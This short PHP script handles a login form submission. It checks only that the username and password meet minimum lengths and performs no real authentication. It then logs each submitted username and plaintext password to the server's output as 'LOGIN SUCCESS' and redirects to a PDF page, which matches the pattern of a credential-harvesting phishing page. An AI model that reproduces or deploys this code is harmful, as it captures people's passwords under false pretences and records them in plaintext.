<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Backend validation
    if (strlen($username) < 6 || strlen($password) < 9) {
        echo "❌ Error: Username must be >5 and Password >8 characters";
        exit;
    }

    // Print to terminal
    file_put_contents(
        "php://stdout",
        "LOGIN SUCCESS | USER: $username | PASS: $password\n"
    );

    // Redirect to pdf page
    header("Location: pdf.html");
    exit;
}
?>
